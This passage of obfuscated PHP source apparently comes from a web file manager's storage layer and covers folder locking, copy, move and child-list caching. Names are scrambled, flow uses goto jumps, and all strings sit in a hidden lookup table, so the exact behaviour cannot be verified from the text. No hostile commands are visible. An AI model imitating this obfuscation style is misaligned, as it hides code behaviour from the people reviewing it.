$A¶“Í–ÖÚÀ . $AÔ­íÈØ[490] . $c Îİƒ‘Õº; if (CacheLock::lockGet($AÔ­íÈØ[491] . $D×³Ãôîê–)) { $bŒÜå §Ï‹ = $this->sourceInfo($c Îİƒ‘Õº); CacheLock::setErrorMsg($AÔ­íÈØ[154] . htmlspecialchars($bŒÜå §Ï‹[$AÔ­íÈØ[28]]) . $AÔ­íÈØ[467] . $B‘•“»¨Ÿ¨); $this->_lockKey($D×³Ãôîê–, 1); $this->_lockKey($D×³Ãôîê–, 0); } } goto CÕÀÌİ¢ßÃ; dË ãæÕ—»: CacheLock::setErrorMsg($AÔ­íÈØ[154] . htmlspecialchars($bŒÜå §Ï‹[$AÔ­íÈØ[28]]) . $AÔ­íÈØ[467] . $B‘•“»¨Ÿ¨); $this->_lockKey($D×³Ãôîê–, 1); $this->_lockKey($D×³Ãôîê–, 0); goto F¨Äë—Ö›; aãÆ®“õœÀ: $AÔ­íÈØ =& $_SERVER[‘®…¢À]; $bŒÜå §Ï‹ = $this->sourceInfo($b…Çêò’Õ‚); $D×³Ãôîê– = $A¶“Í–ÖÚÀ . $AÔ­íÈØ[94] . $b…Çêò’Õ‚; goto A«†èƒ‚î; A«†èƒ‚î: $this->_lockTimeStart[$D×³Ãôîê–] = timeFloat(); if (!is_array($bŒÜå §Ï‹)) { return; } $B‘•“»¨Ÿ¨ = LNG($AÔ­íÈØ[489]); goto dË ãæÕ—»; CÕÀÌİ¢ßÃ: } private function _lockCheckEnd($D¼ÈÀĞ«Û, $C¿óˆŠØñØ) { goto D˜îÀÔÊÚ¸; d±ÎÈ¼ÉÙ·: if ($FÂ²Ï…âÌÃ > 0.5) { unset(self::$cacheSourceInfo[$E¿Õ– ®„[405] . $C¿óˆŠØñØ]); } $b­‘’‘İÁ½ = $this->sourceInfo($C¿óˆŠØñØ); if (!$b­‘’‘İÁ½) { show_json(LNG($E¿Õ– ®„[103]), !1); } goto dÒ˜‹¸¢ØÛ; D˜îÀÔÊÚ¸: $E¿Õ– ®„ =& $_SERVER[‘®…¢À]; $FÔªŒÀ¯¦ = $D¼ÈÀĞ«Û . $E¿Õ– ®„[94] . $C¿óˆŠØñØ; CacheLock::setErrorMsg($E¿Õ– ®„[357]); goto b»÷—Âˆ‡º; b»÷—Âˆ‡º: if (!isset($this->_lockTimeStart[$FÔªŒÀ¯¦])) { return; } $FÂ²Ï…âÌÃ = timeFloat() - $this->_lockTimeStart[$FÔªŒÀ¯¦]; unset($this->_lockTimeStart[$FÔªŒÀ¯¦]); goto d±ÎÈ¼ÉÙ·; dÒ˜‹¸¢ØÛ: } private function _lockParent($C”“Ü²ŞŒ¨, $A‰›¯õ¡·, $AÀ´ïß‘˜‡) { if (!$this->autoLockSet) { return; } $dŠïÎÌÙ¯Õ = $this->sourceInfo($C”“Ü²ŞŒ¨); if (!is_array($dŠïÎÌÙ¯Õ)) { return; } $CëŒ†ä†ôË = array_reverse($this->parentLevelArray($dŠïÎÌÙ¯Õ[$_SERVER[‘®…¢À][454]])); foreach ($CëŒ†ä†ôË as $E¤…ÊöÛâä) { $this->_lockEvent($E¤…ÊöÛâä, $A‰›¯õ¡·, $AÀ´ïß‘˜‡); } } private function _lockEvent($Fƒª´ÆĞ™, $f™è¼ŠÄ¦, $eãĞ–ÛŒ‹) { $eÒ÷¾¸ä× =& $_SERVER[‘®…¢À]; if (!$this->autoLockSet) { return; } foreach ($f™è¼ŠÄ¦ as $Dä„¡†²Öæ) { $Bï¥ƒê²ÃÔ = $Dä„¡†²Öæ . $eÒ÷¾¸ä×[94] . $Fƒª´ÆĞ™; if ($eãĞ–ÛŒ‹ && CacheLock::lockGet($eÒ÷¾¸ä×[491] . $Bï¥ƒê²ÃÔ)) { continue; } $this->_lockKey($Bï¥ƒê²ÃÔ, $eãĞ–ÛŒ‹); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($aµòË®ßŸà, $eÕ˜Ô«çù = 1) { $DÄˆÍÊ‰Ûç = $_SERVER[‘®…¢À][491] . md5($aµòË®ßŸà); if ($eÕ˜Ô«çù) { if (isset(self::$_lockItemArr[$DÄˆÍÊ‰Ûç])) { return; } self::$_lockItemArr[$DÄˆÍÊ‰Ûç] = 1; CacheLock::lock($DÄˆÍÊ‰Ûç, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$DÄˆÍÊ‰Ûç])) { return; } unset(self::$_lockItemArr[$DÄˆÍÊ‰Ûç]); CacheLock::unlock($DÄˆÍÊ‰Ûç); } } public function isParentOf($e¿øä†÷, $dë•¦ğ«Î›) { goto e„½áƒ‹Ñß; aâ÷•àÀô: return $E¶‡š¬Ì„; goto bù ¥òÙ¬; c•ÛæÕ§™À: $dÚÕ¼Æ’­³ = $b·ÖÂ¿ÕÏ¨[$fº†äÏ¡Í[454]] . $b·ÖÂ¿ÕÏ¨[$fº†äÏ¡Í[365]] . $fº†äÏ¡Í[47]; $cÄ©»ˆ§Ô³ = $bÙäªÑ­àØ[$fº†äÏ¡Í[454]] . $bÙäªÑ­àØ[$fº†äÏ¡Í[365]] . $fº†äÏ¡Í[47]; $E¶‡š¬Ì„ = strpos($cÄ©»ˆ§Ô³, $dÚÕ¼Æ’­³) === 0; goto aâ÷•àÀô; e„½áƒ‹Ñß: $fº†äÏ¡Í =& $_SERVER[‘®…¢À]; $b·ÖÂ¿ÕÏ¨ = $this->sourceInfo($e¿øä†÷); $bÙäªÑ­àØ = $this->sourceInfo($dë•¦ğ«Î›); goto c•ÛæÕ§™À; bù ¥òÙ¬: } public function copy($f¯ó‚¶ˆÄå, $B¬¹Ì¤õ, $AÊ†ãØÆˆ = REPEAT_REPLACE, $eÁŠ§ĞÈ±Æ = '') { goto d¸ßÚ´Ï¿Ó; Aøî±‘†ËØ: $this->lockCopyStart($f¯ó‚¶ˆÄå); $this->lockWriteStart($B¬¹Ì¤õ, $Bå›ìåŞ†); $A°áŠôâ•ƒ = array($Eğ±ÚÓçèÁ[492] => array(), $Eğ±ÚÓçèÁ[493] => array(), $Eğ±ÚÓçèÁ[494] => array()); goto cÓ»ğ´¤™‹; d¸ßÚ´Ï¿Ó: $Eğ±ÚÓçèÁ =& $_SERVER[‘®…¢À]; $c¿öì³¥ëÑ = $this->sourceInfo($f¯ó‚¶ˆÄå); $EŒğ·Áåá‹ = $this->sourceInfo($B¬¹Ì¤õ); goto fèˆ³ÇÈ…Á; bÙŒ«éÀøÁ: return $bÄ¯çšÎ‚À; goto D§±•¡õî; DĞ°ë·é: $this->lockCopyEnd($f¯ó‚¶ˆÄå); $this->lockWriteEnd($B¬¹Ì¤õ, $Bå›ìåŞ†); if ($c¿öì³¥ëÑ[$Eğ±ÚÓçèÁ[366]] == $Eğ±ÚÓçèÁ[84] && $dÉ¹»˜µÔÌ == $bÄ¯çšÎ‚À) { $this->folderSizeResetChildren($dÉ¹»˜µÔÌ); } goto fÍ¦ŞÂÌöÕ; cÓ»ğ´¤™‹: $dÉ¹»˜µÔÌ = $this->fileNameExistCache($B¬¹Ì¤õ, $c¿öì³¥ëÑ[$Eğ±ÚÓçèÁ[28]]); $bÄ¯çšÎ‚À = $this->_copy($f¯ó‚¶ˆÄå, $B¬¹Ì¤õ, $AÊ†ãØÆˆ, $A°áŠôâ•ƒ, !0, $eÁŠ§ĞÈ±Æ); $this->_childrenListClear(); goto DĞ°ë·é; fÍ¦ŞÂÌöÕ: Model($Eğ±ÚÓçèÁ[495])->addAll($A°áŠôâ•ƒ[$Eğ±ÚÓçèÁ[493]], array(), !0); if ($dÉ¹»˜µÔÌ != $bÄ¯çšÎ‚À || $c¿öì³¥ëÑ[$Eğ±ÚÓçèÁ[366]] == $Eğ±ÚÓçèÁ[84]) { Model($Eğ±ÚÓçèÁ[496])->eventCopy($bÄ¯çšÎ‚À); } $this->saveAll($A°áŠôâ•ƒ[$Eğ±ÚÓçèÁ[494]]); goto a®˜¯èÓ”; fèˆ³ÇÈ…Á: if (!$c¿öì³¥ëÑ || !$EŒğ·Áåá‹ || $EŒğ·Áåá‹[$Eğ±ÚÓçèÁ[366]] != $Eğ±ÚÓçèÁ[84]) { return !1; } if ($this->isParentOf($f¯ó‚¶ˆÄå, $B¬¹Ì¤õ)) { return !1; } $Bå›ìåŞ† = $eÁŠ§ĞÈ±Æ ? $eÁŠ§ĞÈ±Æ : $c¿öì³¥ëÑ[$Eğ±ÚÓçèÁ[28]]; goto Aøî±‘†ËØ; a®˜¯èÓ”: Model($Eğ±ÚÓçèÁ[164])->linkAdd($A°áŠôâ•ƒ[$Eğ±ÚÓçèÁ[492]]); $this->folderSizeReset($B¬¹Ì¤õ); $this->updateModifyTime($B¬¹Ì¤õ); goto bÙŒ«éÀøÁ; D§±•¡õî: } private function _copy($b©ÁˆšñŠ†, $A²Ìé…”, $eáÂÆ­’êæ, &$cƒè’¨‹ÌÖ, $c‚à¥Ñ…»°, $aÇ¨¥Ò‹àŞ = '') { goto aªÖÁêºÕ; aªÖÁêºÕ: $B¹äèéí…ó =& $_SERVER[‘®…¢À]; $A¢¼†•®‘§ = $this->sourceInfoCache($b©ÁˆšñŠ†); $cÍËğÒ“ª = $A¢¼†•®‘§[$B¹äèéí…ó[366]] == $B¹äèéí…ó[84]; goto EÉíÕòŒÄ‡; cêƒÉÀ†ºÂ: if (!$d›ìù‘ª‰) { return $this->_copyCreate($b©ÁˆšñŠ†, $A²Ìé…”, $eÎ¾èï„…å, $cƒè’¨‹ÌÖ); } $D¸ãó°¦ª² = $d›ìù‘ª‰; if ($cÍËğÒ“ª) { if ($eáÂÆ­’êæ == REPEAT_RENAME_FOLDER) { $eÎ¾èï„…å = $this->fileNameAutoCache($A²Ìé…”, $eÎ¾èï„…å, $eáÂÆ­’êæ, $cÍËğÒ“ª); $D¸ãó°¦ª² = $this->_copyCreate($b©ÁˆšñŠ†, $A²Ìé…”, $eÎ¾èï„…å, $cƒè’¨‹ÌÖ); } else { $eÑğø¾…â = $this->_childrenList($b©ÁˆšñŠ†); foreach ($eÑğø¾…â as $eòàºİÇôˆ) { $this->_copy($eòàºİÇôˆ[$B¹äèéí…ó[365]], $d›ìù‘ª‰, $eáÂÆ­’êæ, $cƒè’¨‹ÌÖ, !1); } } } else { if ($eáÂÆ­’êæ == REPEAT_RENAME || $eáÂÆ­’êæ == REPEAT_RENAME_FOLDER) { $eÎ¾èï„…å = $this->fileNameAutoCache($A²Ìé…”, $eÎ¾èï„…å, $eáÂÆ­’êæ, $cÍËğÒ“ª); $D¸ãó°¦ª² = $this->_copyCreate($b©ÁˆšñŠ†, $A²Ìé…”, $eÎ¾èï„…å, $cƒè’¨‹ÌÖ); } else { if ($eáÂÆ­’êæ == REPEAT_REPLACE) { $Fè…·‹Ü¨î = $this->sourceInfoCache($d›ìù‘ª‰); $d·ÆÙôŠİ = $this->fileHistory($Fè…·‹Ü¨î, $A¢¼†•®‘§[$B¹äèéí…ó[414]], $A¢¼†•®‘§[$B¹äèéí…ó[78]]); if ($d·ÆÙôŠİ) { $cƒè’¨‹ÌÖ[$B¹äèéí…ó[492]][] = $A¢¼†•®‘§[$B¹äèéí…ó[414]]; } } else { if ($eáÂÆ­’êæ == REPEAT_SKIP) { } } } Hook::trigger($B¹äèéí…ó[497], array($B¹äèéí…ó[498], $A¢¼†•®‘§, 0)); } goto AŠä‡¼è·Ü; AŠä‡¼è·Ü: return $D¸ãó°¦ª²; goto DãÈ‘—ÄÉ‹; EÉíÕòŒÄ‡: $eÎ¾èï„…å = $aÇ¨¥Ò‹àŞ ? $aÇ¨¥Ò‹àŞ : $A¢¼†•®‘§[$B¹äèéí…ó[28]]; $d›ìù‘ª‰ = $this->fileNameExistCache($A²Ìé…”, $eÎ¾èï„…å); if ($c‚à¥Ñ…»°) { $this->_childrenAllMake($b©ÁˆšñŠ†); if ($cÍËğÒ“ª && $d›ìù‘ª‰) { $this->_childrenAllMake($d›ìù‘ª‰); } } goto cêƒÉÀ†ºÂ; DãÈ‘—ÄÉ‹: } private function _copyCreate($C£ğ÷¿è¡¸, $F†ÔñË¦¶, $Dêöö²Ï«í, &$fšÄŒÄ¢‚º) { goto EÛƒ•Œ±ÉÙ; a‚«‡è˜¥½: $a¢¤±»«â = $this->sourceInfo($F Å‰²ÂÚ¹); foreach ($Cƒ‰„ÇÄ É as $F¿ŠØ ¾¬) { $F¼©¹ÁÇÆ = $this->_makeItemData($F¿ŠØ ¾¬, $a¢¤±»«â, $F¿ŠØ ¾¬[$FáÑÅëİ…ã[28]]); $F¼©¹ÁÇÆ[$FáÑÅëİ…ã[454]] = $F¿ŠØ ¾¬[$FáÑÅëİ…ã[454]]; $FŞ¸ƒŠËø¿[] = $F¼©¹ÁÇÆ; } $this->chunkEventSet($FáÑÅëİ…ã[502], array($FáÑÅëİ…ã[503], $a¬å©Äãñ, $BËšöğàæ)); goto cğ÷àœÅË; cğ÷àœÅË: $this->addAll($FŞ¸ƒŠËø¿, array(), !1); $eä­ê‡‰£Ó = $this->where(array($FáÑÅëİ…ã[456] => $F Å‰²ÂÚ¹))->select(); $E—Ï­‚”Ë‚ = $this->_childrenMakeRelation($Cƒ‰„ÇÄ É, $eä­ê‡‰£Ó); goto F•ƒÙÔ¯§Ä; F±ù‘¹ïİ: $this->chunkEventSet($FáÑÅëİ…ã[506], array($FáÑÅëİ…ã[507], $a¬å©Äãñ, $BËšöğàæ)); $this->saveAll($fœÛô°‘´); return $F Å‰²ÂÚ¹; goto CáÀøáÑæì; e©îØÌšÀä: if ($f¹Œ¡®Ê¾„[$FáÑÅëİ…ã[366]] != $FáÑÅëİ…ã[84]) { $fšÄŒÄ¢‚º[$FáÑÅëİ…ã[492]][] = $f¹Œ¡®Ê¾„[$FáÑÅëİ…ã[414]]; return $F Å‰²ÂÚ¹; } $Cƒ‰„ÇÄ É = array(); $FŞ¸ƒŠËø¿ = array(); goto bèÕ½ÀŠ†Ğ; EÛƒ•Œ±ÉÙ: $FáÑÅëİ…ã =& $_SERVER[‘®…¢À]; $f¹Œ¡®Ê¾„ = $this->sourceInfoCache($C£ğ÷¿è¡¸); $F¡á­·àå‚ = $this->sourceInfoCache($F†ÔñË¦¶); goto e˜Í´ŒöÙÓ; F•ƒÙÔ¯§Ä: $E—Ï­‚”Ë‚[$C£ğ÷¿è¡¸] = $F Å‰²ÂÚ¹; $E¿›˜ˆ°Í´ = array(); $fœÛô°‘´ = array(); goto dÆ¶á¤Æëç; dÆ¶á¤Æëç: foreach ($eä­ê‡‰£Ó as $F¿ŠØ ¾¬) { $F«Ç»™»ãÙ = $F¿ŠØ ¾¬[$FáÑÅëİ…ã[365]]; $DãĞÕòÛ‡ = $this->_childrenMatch($E—Ï­‚”Ë‚, $F¿ŠØ ¾¬, $a¢¤±»«â); $E¿›˜ˆ°Í´[] = array($FáÑÅëİ…ã[365], $F«Ç»™»ãÙ, $FáÑÅëİ…ã[456], $DãĞÕòÛ‡[$FáÑÅëİ…ã[456]]); $fœÛô°‘´[] = array($FáÑÅëİ…ã[365], $F«Ç»™»ãÙ, $FáÑÅëİ…ã[454], $DãĞÕòÛ‡[$FáÑÅëİ…ã[454]]); $this->_copyApplyMeta($F¿ŠØ ¾¬, $fšÄŒÄ¢‚º); if ($F¿ŠØ ¾¬[$FáÑÅëİ…ã[366]] != $FáÑÅëİ…ã[84]) { $fšÄŒÄ¢‚º[$FáÑÅëİ…ã[492]][] = $F¿ŠØ ¾¬[$FáÑÅëİ…ã[414]]; } } $this->chunkEventSet($FáÑÅëİ…ã[504], array($FáÑÅëİ…ã[505], $a¬å©Äãñ, $BËšöğàæ)); $this->saveAll($E¿›˜ˆ°Í´); goto F±ù‘¹ïİ; e˜Í´ŒöÙÓ: $a¬å©Äãñ = $this->_makeItemData($f¹Œ¡®Ê¾„, $F¡á­·àå‚, $Dêöö²Ï«í); Hook::trigger($FáÑÅëİ…ã[499], $a¬å©Äãñ); Hook::trigger($FáÑÅëİ…ã[500], array($FáÑÅëİ…ã[501], $a¬å©Äãñ, 0)); goto bµºò¼Îã©; bèÕ½ÀŠ†Ğ: $this->_childrenListAll($C£ğ÷¿è¡¸, $Cƒ‰„ÇÄ É); $BËšöğàæ = count($Cƒ‰„ÇÄ É); if ($BËšöğàæ == 0) { return $F Å‰²ÂÚ¹; } goto a‚«‡è˜¥½; bµºò¼Îã©: $F Å‰²ÂÚ¹ = $this->add($a¬å©Äãñ); $b¥ïÜÓÀß = array($FáÑÅëİ…ã[365] => $F Å‰²ÂÚ¹, $FáÑÅëİ…ã[28] => $Dêöö²Ï«í); $this->_copyApplyMeta($b¥ïÜÓÀß, $fšÄŒÄ¢‚º); goto e©îØÌšÀä; CáÀøáÑæì: } private function _childrenMakeRelation($CÚÜ¯Ûµ², $DµÆ±¹÷£´) { $DÚ‹ëµ½é¦ =& $_SERVER[‘®…¢À]; $E†Ùäé’µ¢ = array(); $E¼…‹µ¸‡ = array(); foreach ($CÚÜ¯Ûµ² as $AéßçãŸğ) { $F‰¶Ìß§±„ = $AéßçãŸğ[$DÚ‹ëµ½é¦[28]] . $DÚ‹ëµ½é¦[8] . $AéßçãŸğ[$DÚ‹ëµ½é¦[454]]; $E†Ùäé’µ¢[$F‰¶Ìß§±„] = $AéßçãŸğ[$DÚ‹ëµ½é¦[365]]; } foreach ($DµÆ±¹÷£´ as $AéßçãŸğ) { $F‰¶Ìß§±„ = $AéßçãŸğ[$DÚ‹ëµ½é¦[28]] . $DÚ‹ëµ½é¦[8] . $AéßçãŸğ[$DÚ‹ëµ½é¦[454]]; $B›ä‹Ø·³õ = $E†Ùäé’µ¢[$F‰¶Ìß§±„]; $E¼…‹µ¸‡[$B›ä‹Ø·³õ] = $AéßçãŸğ[$DÚ‹ëµ½é¦[365]]; } return $E¼…‹µ¸‡; } private function _childrenMatch($dÏºá¯£èÒ, $e¾­·¬”», $Dâ–©Ğ“Ÿ‘) { goto eÆ ¨¨ù‹; eî‚¾ÛÓ„Ì: $FïÏ»çÄ‚ = $f·¤×¯æ‡Ñ[count($f·¤×¯æ‡Ñ) - 1]; return array($D˜§¥‘¢ˆ´[456] => $FïÏ»çÄ‚, $D˜§¥‘¢ˆ´[454] => $CÔâçÃàÉ‹); goto eÚªï„ßÎ’; eÆ ¨¨ù‹: $D˜§¥‘¢ˆ´ =& $_SERVER[‘®…¢À]; $CÔâçÃàÉ‹ = $Dâ–©Ğ“Ÿ‘[$D˜§¥‘¢ˆ´[454]]; $a‰‘‰“•åñ = $this->parentLevelArray($e¾­·¬”»[$D˜§¥‘¢ˆ´[454]]); goto C°ƒÉ»¥ô¸; C°ƒÉ»¥ô¸: foreach ($a‰‘‰“•åñ as $AïÁö·¥ô›) { if (isset($dÏºá¯£èÒ[$AïÁö·¥ô›])) { $CÔâçÃàÉ‹ .= $dÏºá¯£èÒ[$AïÁö·¥ô›] . $D˜§¥‘¢ˆ´[508]; } } $CÔâçÃàÉ‹ = rtrim($CÔâçÃàÉ‹, $D˜§¥‘¢ˆ´[47]) . $D˜§¥‘¢ˆ´[47]; $f·¤×¯æ‡Ñ = $this->parentLevelArray($CÔâçÃàÉ‹); goto eî‚¾ÛÓ„Ì; eÚªï„ßÎ’: } private function _makeItemData($D®è·Êå‡, $A¦Çñ‘ãá¥, $E¡Ö”¶ÏãÎ) { $AÂ±º«¼Ûˆ =& $_SERVER[‘®…¢À]; $FµÀÕ­ô¢ó = array($AÂ±º«¼Ûˆ[509] => $D®è·Êå‡[$AÂ±º«¼Ûˆ[366]], $AÂ±º«¼Ûˆ[382] => $E¡Ö”¶ÏãÎ, $AÂ±º«¼Ûˆ[510] => $D®è·Êå‡[$AÂ±º«¼Ûˆ[368]], $AÂ±º«¼Ûˆ[415] => $D®è·Êå‡[$AÂ±º«¼Ûˆ[414]], $AÂ±º«¼Ûˆ[511] => $D®è·Êå‡[$AÂ±º«¼Ûˆ[78]], $AÂ±º«¼Ûˆ[512] => $A¦Çñ‘ãá¥[$AÂ±º«¼Ûˆ[367]], $AÂ±º«¼Ûˆ[513] => $A¦Çñ‘ãá¥[$AÂ±º«¼Ûˆ[451]], $AÂ±º«¼Ûˆ[514] => USER_ID, $AÂ±º«¼Ûˆ[515] => USER_ID, $AÂ±º«¼Ûˆ[364] => $A¦Çñ‘ãá¥[$AÂ±º«¼Ûˆ[365]], $AÂ±º«¼Ûˆ[516] => $A¦Çñ‘ãá¥[$AÂ±º«¼Ûˆ[454]] . $A¦Çñ‘ãá¥[$AÂ±º«¼Ûˆ[365]] . $AÂ±º«¼Ûˆ[47], $AÂ±º«¼Ûˆ[391] => 0, $AÂ±º«¼Ûˆ[517] => $AÂ±º«¼Ûˆ[33]); return $FµÀÕ­ô¢ó; } private function _copyApplyMeta($d¥·ÉÛŸ•™, &$EšŠù³±ˆ£) { $Dõ¥µ“åÌ =& $_SERVER[‘®…¢À]; $Cª³Æœ÷¹° = $d¥·ÉÛŸ•™[$Dõ¥µ“åÌ[365]]; $EôÎ§÷“ê = $d¥·ÉÛŸ•™[$Dõ¥µ“åÌ[28]]; if (!isset($d¥·ÉÛŸ•™[$Dõ¥µ“åÌ[518]]) || !$d¥·ÉÛŸ•™[$Dõ¥µ“åÌ[518]] || $d¥·ÉÛŸ•™[$Dõ¥µ“åÌ[518]] == $Dõ¥µ“åÌ[463]) { $EšŠù³±ˆ£[$Dõ¥µ“åÌ[494]][] = array($Dõ¥µ“åÌ[365], $Cª³Æœ÷¹°, $Dõ¥µ“åÌ[518], short_id($Cª³Æœ÷¹°)); } if (Input::check($EôÎ§÷“ê, $Dõ¥µ“åÌ[519])) { $EšŠù³±ˆ£[$Dõ¥µ“åÌ[493]][] = array($Dõ¥µ“åÌ[365] => $Cª³Æœ÷¹°, $Dõ¥µ“åÌ[90] => $Dõ¥µ“åÌ[411], $Dõ¥µ“åÌ[355] => str_replace($Dõ¥µ“åÌ[50], $Dõ¥µ“åÌ[33], Pinyin::encode($EôÎ§÷“ê))); $EšŠù³±ˆ£[$Dõ¥µ“åÌ[493]][] = array($Dõ¥µ“åÌ[365] => $Cª³Æœ÷¹°, $Dõ¥µ“åÌ[90] => $Dõ¥µ“åÌ[410], $Dõ¥µ“åÌ[355] => Pinyin::encode($EôÎ§÷“ê, $Dõ¥µ“åÌ[520])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($c¯…êçëôä) { goto F¯Š™²¶ïã; Fù´®ù¢İ‹: $eÁ‡¨¡°†à = array($bøÇ÷ÇŠÀ[454] => array($bøÇ÷ÇŠÀ[474], $dµŒÀ”‹­[$bøÇ÷ÇŠÀ[454]] . $c¯…êçëôä . $bøÇ÷ÇŠÀ[475]), $bøÇ÷ÇŠÀ[392] => 0); $dçõ÷±¿ = $this->field($cª®Ÿ‡åË÷)->where($eÁ‡¨¡°†à)->select(); if (!$dçõ÷±¿) { return; } goto dŠ‹ÉÙ²Á³; dŠ‹ÉÙ²Á³: $dçõ÷±¿ = array_to_keyvalue($dçõ÷±¿, $bøÇ÷ÇŠÀ[365]); foreach ($dçõ÷±¿ as $a¨ÒÍÃ¡„Û) { $D ƒÏåÖ = $a¨ÒÍÃ¡„Û[$bøÇ÷ÇŠÀ[456]]; $c¯…êçëôä = $a¨ÒÍÃ¡„Û[$bøÇ÷ÇŠÀ[365]]; if (!isset($this->_childrenListCache[$c¯…êçëôä]) && $a¨ÒÍÃ¡„Û[$bøÇ÷ÇŠÀ[366]] == $bøÇ÷ÇŠÀ[84]) { $this->_childrenListCache[$c¯…êçëôä] = array(); } if (!isset($this->_childrenListCache[$D ƒÏåÖ])) { $this->_childrenListCache[$D ƒÏåÖ] = array(); } $this->_childrenListCache[$D ƒÏåÖ][$c¯…êçëôä] = $a¨ÒÍÃ¡„Û; $this->_childrenItemCache[$c¯…êçëôä] = $a¨ÒÍÃ¡„Û; } goto bôÑ¬·×; F¯Š™²¶ïã: $bøÇ÷ÇŠÀ =& $_SERVER[‘®…¢À]; $dµŒÀ”‹­ = $this->sourceInfo($c¯…êçëôä); $cª®Ÿ‡åË÷ = $bøÇ÷ÇŠÀ[521]; goto Fù´®ù¢İ‹; bôÑ¬·×: } private function _childrenListAll($A‹‰ÌâÒ, &$DíÚ…‰Î›­) { $dÏªÖ“İ =& $_SERVER[‘®…¢À]; if (!isset($this->_childrenListCache[$A‹‰ÌâÒ])) { return; } $e¥ğĞ™¤ŒÁ = $this->_childrenListCache[$A‹‰ÌâÒ]; foreach ($e¥ğĞ™¤ŒÁ as $bíÄŞÆŸé => $E–ô…‡‚‚) { $DíÚ…‰Î›­[$bíÄŞÆŸé] = $E–ô…‡‚‚; if ($E–ô…‡‚‚[$dÏªÖ“İ[366]] == $dÏªÖ“İ[84]) { $this->_childrenListAll($bíÄŞÆŸé, $DíÚ…‰Î›­); } } } private function sourceInfoCache($dÉòçñÕ“) { if (isset($this->_childrenItemCache[$dÉòçñÕ“])) { return $this->_childrenItemCache[$dÉòçñÕ“]; } return $this->sourceInfo($dÉòçñÕ“); } private function _childrenList($eŞÜ§ÛÎÑ) { if (isset($this->_childrenListCache[$eŞÜ§ÛÎÑ])) { return $this->_childrenListCache[$eŞÜ§ÛÎÑ]; } return $this->_childrenListSelect($eŞÜ§ÛÎÑ); } private function _childrenListSelect($A¤¥ß‡‹¡) { goto f‹¿¢ÔÜ; aÑÕÓ Ç‚ñ: $B—«ïŞİÓÕ = $B—«ïŞİÓÕ ? $B—«ïŞİÓÕ : array(); $b”¬™ñª—˜ = array_to_keyvalue($B—«ïŞİÓÕ, $F±´âõŒã[365]); $this->_childrenListCache[$A¤¥ß‡‹¡] = $b”¬™ñª—˜; goto fœÔÜÌøéŠ; f‹¿¢ÔÜ: $F±´âõŒã =& $_SERVER[‘®…¢À]; $e¬ØĞùÀÙ = array($F±´âõŒã[456] => $A¤¥ß‡‹¡, $F±´âõŒã[392] => 0); $B—«ïŞİÓÕ = $this->where($e¬ØĞùÀÙ)->select(); goto aÑÕÓ Ç‚ñ; fœÔÜÌøéŠ: foreach ($b”¬™ñª—˜ as $A¤¥ß‡‹¡ => $C¡¥”±í¢ˆ) { $this->_childrenItemCache[$A¤¥ß‡‹¡] = $C¡¥”±í¢ˆ; } return $b”¬™ñª—˜; goto DªÛÍœÁŸ; DªÛÍœÁŸ: } private function fileNameExistCache($cœØì²‘¿ , $cèíáÈ™òô) { $CšÚĞ˜ÙÚ½ =& $_SERVER[‘®…¢À]; $cèíáÈ™òô = strtolower($cèíáÈ™òô); $dÄƒ¢ÇÌÍƒ = $this->_childrenList($cœØì²‘¿ ); foreach ($dÄƒ¢ÇÌÍƒ as $aÆá’ÜÜÀà) { if ($cèíáÈ™òô == strtolower($aÆá’ÜÜÀà[$CšÚĞ˜ÙÚ½[28]])) { return $aÆá’ÜÜÀà[$CšÚĞ˜ÙÚ½[365]]; } } return !1; } private function fileNameAutoCache($FàŞÀ—¶, $eêÅîÃ‚ºÁ, $Còß©“ÆÛµ, $dì«¦—) { $Aªøôâ“ÎŒ =& $_SERVER[‘®…¢À]; $E‘©ª´¢˜Á = $this->_childrenList($FàŞÀ—¶); $C×ÃñÃÓ²• = array_to_keyvalue($E‘©ª´¢˜Á, $Aªøôâ“ÎŒ[33], $Aªøôâ“ÎŒ[28]); return $this->fileNameAutoGet($C×ÃñÃÓ²•, $eêÅîÃ‚ºÁ, $Còß©“ÆÛµ, $dì«¦—); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($c¤ °‚İÜİ, $b›Ğ•Ù•ãÛ, $Eˆ©òÚÒ‚ = REPEAT_REPLACE, $Aáœ‹†÷Ïì = '') { goto d’ëä¾ÚŒ˜; CÒÜŞ‡ò¨×: if ($AÅ†ìŠÕÑÓ && $Fó§á»ØŠ[$A…ò§»å† [524]]) { $this->remove($c¤ °‚İÜİ, !1); } $this->lockMoveEnd($c¤ °‚İÜİ); $this->lockWriteEnd($b›Ğ•Ù•ãÛ, $fÔÉÛø°«¹); goto fÌáŒ£Í¯; cŒóáï¾¹ñ: $this->lockMoveStart($c¤ °‚İÜİ); $this->lockWriteStart($b›Ğ•Ù•ãÛ, $fÔÉÛø°«¹); $Fó§á»ØŠ = array($A…ò§»å† [492] => array(), $A…ò§»å† [524] => !1); goto bÉ´àŠ¶Ÿ; fÌáŒ£Í¯: $this->folderSizeReset($eÜæ¯®İ›Œ[$A…ò§»å† [456]]); $this->folderSizeReset($b›Ğ•Ù•ãÛ); $b“ÈŒªô„ = array($eÜæ¯®İ›Œ[$A…ò§»å† [456]], $b›Ğ•Ù•ãÛ); goto dÚ‰ø—È‹; bÉ´àŠ¶Ÿ: $this->clearShare($c¤ °‚İÜİ, $b›Ğ•Ù•ãÛ); $AÅ†ìŠÕÑÓ = $this->fileNameExistCache($b›Ğ•Ù•ãÛ, $eÜæ¯®İ›Œ[$A…ò§»å† [28]]); $c²éá—Œ¦ = $this->_move($c¤ °‚İÜİ, $b›Ğ•Ù•ãÛ, $Eˆ©òÚÒ‚, $Fó§á»ØŠ, $Aáœ‹†÷Ïì); goto e¼¦À¤ë‹å; aİÆ®ÁÒ¾: Hook::trigger($A…ò§»å† [522], $A·ÀÊÜÚÓÚ); if ($eÜæ¯®İ›Œ[$A…ò§»å† [456]] == $b›Ğ•Ù•ãÛ && $Aáœ‹†÷Ïì != $eÜæ¯®İ›Œ[$A…ò§»å† [28]]) { $B­íÕïÊà = $this->fileNameExist($b›Ğ•Ù•ãÛ, $Aáœ‹†÷Ïì); if ($B­íÕïÊà && $eÜæ¯®İ›Œ[$A…ò§»å† [366]] == $A…ò§»å† [463]) { goto d‘èµí’ã‘; bäÖ¿·Ò©ğ: return $B­íÕïÊà; goto D 